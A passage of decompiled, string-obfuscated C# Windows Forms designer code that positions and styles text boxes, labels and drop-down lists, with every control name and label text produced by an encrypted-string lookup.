		((Control)textBox29).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F725760 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)textBox29).Size = new Size(100, 23);
		((Control)textBox29).TabIndex = 154;
		((Control)textBox29).TextChanged += textBox29_TextChanged;
		((Control)textBox30).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 10f, (FontStyle)1);
		((Control)textBox30).Location = new Point(748, 493);
		((Control)textBox30).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002AB83 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((Control)textBox30).Size = new Size(102, 23);
		((Control)textBox30).TabIndex = 153;
		((Control)textBox30).TextChanged += textBox30_TextChanged;
		((Control)textBox31).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54044185 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc), 10f, (FontStyle)1);
		((Control)textBox31).Location = new Point(856, 493);
		((Control)textBox31).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E99D2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)textBox31).Size = new Size(100, 23);
		((Control)textBox31).TabIndex = 152;
		((Control)textBox31).TextChanged += textBox31_TextChanged;
		((Control)label48).AutoSize = true;
		((Control)label48).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE9806 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe), 10f, (FontStyle)1);
		((Control)label48).ForeColor = SystemColors.ControlLightLight;
		((Control)label48).Location = new Point(746, 473);
		((Control)label48).Margin = new Padding(5, 0, 5, 0);
		((Control)label48).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12236680 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((Control)label48).Size = new Size(20, 16);
		((Control)label48).TabIndex = 151;
		((Control)label48).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A455A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)label49).AutoSize = true;
		((Control)label49).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3CE3A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49), 10f, (FontStyle)1);
		((Control)label49).ForeColor = SystemColors.ControlLightLight;
		((Control)label49).Location = new Point(857, 473);
		((Control)label49).Margin = new Padding(5, 0, 5, 0);
		((Control)label49).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E92409 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label49).Size = new Size(91, 16);
		((Control)label49).TabIndex = 150;
		((Control)label49).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EBF6A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)label50).AutoSize = true;
		((Control)label50).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6A3D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc), 10f, (FontStyle)1);
		((Control)label50).ForeColor = SystemColors.ControlLightLight;
		((Control)label50).Location = new Point(638, 473);
		((Control)label50).Margin = new Padding(5, 0, 5, 0);
		((Control)label50).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DAA9F3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)label50).Size = new Size(77, 16);
		((Control)label50).TabIndex = 149;
		((Control)label50).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FB6F5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		comboBox14.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox14).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C9934 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823), 10f, (FontStyle)1);
		((ListControl)comboBox14).FormattingEnabled = true;
		comboBox14.Items.AddRange(new object[7]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A45E4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69461021 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF3AB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2A85D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A638B61 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319E9EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DDEBD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d)
		});
		((Control)comboBox14).Location = new Point(380, 666);
		((Control)comboBox14).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox14).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD0467FE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925);
		((Control)comboBox14).Size = new Size(213, 24);
		((Control)comboBox14).TabIndex = 148;
		comboBox14.SelectedIndexChanged += comboBox14_SelectedIndexChanged;
		((Control)label51).AutoSize = true;
		((Control)label51).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF9FEC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc), 10f, (FontStyle)1);
		((Control)label51).ForeColor = SystemColors.ControlLightLight;
		((Control)label51).Location = new Point(379, 647);
		((Control)label51).Margin = new Padding(5, 0, 5, 0);
		((Control)label51).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DE7B5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((Control)label51).Size = new Size(81, 16);
		((Control)label51).TabIndex = 147;
		((Control)label51).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13741351 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		comboBox15.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox15).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 10f, (FontStyle)1);
		((ListControl)comboBox15).FormattingEnabled = true;
		comboBox15.Items.AddRange(new object[10]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0D7BF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A5ADC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF361 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DDF23 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -1777824090 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FA86B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x605824E1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA91DD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8DD88 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E15F1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40)
		});
		((Control)comboBox15).Location = new Point(197, 666);
		((Control)comboBox15).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox15).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1BA13EE6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((Control)comboBox15).Size = new Size(173, 24);
		((Control)comboBox15).TabIndex = 146;
		comboBox15.SelectedIndexChanged += comboBox15_SelectedIndexChanged;
		((Control)label52).AutoSize = true;
		((Control)label52).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x26558886 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2f12304c094c4981ae78cdfa1dc9cd9e), 10f, (FontStyle)1);
		((Control)label52).ForeColor = SystemColors.ControlLightLight;
		((Control)label52).Location = new Point(202, 647);
		((Control)label52).Margin = new Padding(5, 0, 5, 0);
		((Control)label52).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69462997 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f);
		((Control)label52).Size = new Size(74, 16);
		((Control)label52).TabIndex = 145;
		((Control)label52).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC116C4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06);
		comboBox16.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox16).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB04 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6), 10f, (FontStyle)1);
		((ListControl)comboBox16).FormattingEnabled = true;
		comboBox16.Items.AddRange(new object[8]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD045F1C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB20B5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0D62B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12235F32 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x6D6118A2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A638AB7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x60582411 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dbb1db1002814c06a313ab667583ca7c),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF86B8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc)
		});
		((Control)comboBox16).Location = new Point(10, 666);
		((Control)comboBox16).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox16).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E9932 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)comboBox16).Size = new Size(177, 24);
		((Control)comboBox16).TabIndex = 144;
		comboBox16.SelectedIndexChanged += comboBox16_SelectedIndexChanged;
		((Control)label53).AutoSize = true;
		((Control)label53).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12710B6C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2), 10f, (FontStyle)1);
		((Control)label53).ForeColor = SystemColors.ControlLightLight;
		((Control)label53).Location = new Point(10, 647);
		((Control)label53).Margin = new Padding(5, 0, 5, 0);
		((Control)label53).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160849C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0);
		((Control)label53).Size = new Size(75, 16);
		((Control)label53).TabIndex = 143;
		((Control)label53).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C8112 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		comboBox18.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox18).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D6DE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3), 10f, (FontStyle)1);
		((ListControl)comboBox18).FormattingEnabled = true;
		((Control)comboBox18).Location = new Point(10, 610);
		((Control)comboBox18).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox18).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875FA89 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3);
		((Control)comboBox18).Size = new Size(223, 24);
		((Control)comboBox18).TabIndex = 140;
		comboBox18.SelectedIndexChanged += comboBox18_SelectedIndexChanged;
		((Control)textBox32).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E9048F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61), 10f, (FontStyle)1);
		((Control)textBox32).Location = new Point(178, 555);
		((Control)textBox32).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BFBC20 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((Control)textBox32).Size = new Size(100, 23);
		((Control)textBox32).TabIndex = 139;
		((Control)textBox32).TextChanged += textBox32_TextChanged;
		((Control)textBox33).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AE6D3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549), 10f, (FontStyle)1);
		((Control)textBox33).Location = new Point(284, 555);
		((Control)textBox33).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54046273 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc);
		((Control)textBox33).Size = new Size(203, 23);
		((Control)textBox33).TabIndex = 138;
		((Control)textBox33).TextChanged += textBox33_TextChanged;
		((Control)textBox34).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 10f, (FontStyle)1);
		((Control)textBox34).Location = new Point(493, 555);
		((Control)textBox34).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608E9ADC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		((Control)textBox34).Size = new Size(100, 23);
		((Control)textBox34).TabIndex = 137;
		((Control)textBox34).TextChanged += textBox34_TextChanged;
		((Control)label54).AutoSize = true;
		((Control)label54).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1160A4AA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_07094e8430e84644a3b46793c68193e0), 10f, (FontStyle)1);
		((Control)label54).ForeColor = SystemColors.ControlLightLight;
		((Control)label54).Location = new Point(10, 592);
		((Control)label54).Margin = new Padding(5, 0, 5, 0);
		((Control)label54).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x63EED52C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70403a9e26494e1a929252072003a0e6);
		((Control)label54).Size = new Size(77, 16);
		((Control)label54).TabIndex = 136;
		((Control)label54).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2AABD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)label57).AutoSize = true;
		((Control)label57).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1146229973 ^ 0x6F239C15 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33), 10f, (FontStyle)1);
		((Control)label57).ForeColor = SystemColors.ControlLightLight;
		((Control)label57).Location = new Point(176, 536);
		((Control)label57).Margin = new Padding(5, 0, 5, 0);
		((Control)label57).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A63B169 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427);
		((Control)label57).Size = new Size(33, 16);
		((Control)label57).TabIndex = 133;
		((Control)label57).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B311C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63);
		((Control)label58).AutoSize = true;
		((Control)label58).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C9934 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823), 10f, (FontStyle)1);
		((Control)label58).ForeColor = SystemColors.ControlLightLight;
		((Control)label58).Location = new Point(282, 536);
		((Control)label58).Margin = new Padding(5, 0, 5, 0);
		((Control)label58).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8E6A4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)label58).Size = new Size(50, 16);
		((Control)label58).TabIndex = 132;
		((Control)label58).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC1140E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06);
		((Control)label59).AutoSize = true;
		((Control)label59).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB3955 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f), 10f, (FontStyle)1);
		((Control)label59).ForeColor = SystemColors.ControlLightLight;
		((Control)label59).Location = new Point(490, 536);
		((Control)label59).Margin = new Padding(5, 0, 5, 0);
		((Control)label59).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C9AC587 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0d8c03b1d7c340b4853785e650ce2549);
		((Control)label59).Size = new Size(70, 16);
		((Control)label59).TabIndex = 131;
		((Control)label59).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA312E7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee);
		((Control)label60).AutoSize = true;
		((Control)label60).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8C502 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e), 10f, (FontStyle)1);
		((Control)label60).ForeColor = SystemColors.ControlLightLight;
		((Control)label60).Location = new Point(10, 536);
		((Control)label60).Margin = new Padding(5, 0, 5, 0);
		((Control)label60).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E927CD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label60).Size = new Size(43, 16);
		((Control)label60).TabIndex = 130;
		((Control)label60).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE8252 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe);
		((Control)textBox35).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6A3D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc), 10f, (FontStyle)1);
		((Control)textBox35).Location = new Point(404, 493);
		((Control)textBox35).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F7254CA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165);
		((Control)textBox35).Size = new Size(191, 23);
		((Control)textBox35).TabIndex = 129;
		((Control)textBox35).TextChanged += textBox35_TextChanged;
